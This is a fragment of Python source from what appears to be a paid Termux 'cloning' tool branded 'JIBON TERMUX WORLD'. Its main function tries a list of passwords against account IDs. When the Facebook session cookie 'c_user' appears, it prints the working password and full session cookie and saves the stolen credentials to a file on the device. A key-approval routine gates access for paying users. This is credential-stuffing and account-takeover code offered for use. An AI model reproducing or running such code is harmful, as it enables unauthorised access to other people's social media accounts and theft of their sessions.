...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJIBON TERMUX WORLD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [JIBON TERMUX WORLD-❤️‍🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[❤️‍🔥]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/JIBON TERMUX WORLDok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    if id in DARK:
        ...
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│      Note : Paid tools 100% ok id just now login           │\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print(" \x1b[38;5;83mYour Key is Not Approved ")
        print(" \x1b[38;5;83mCopy And Send Key To Admin")
        print ("")
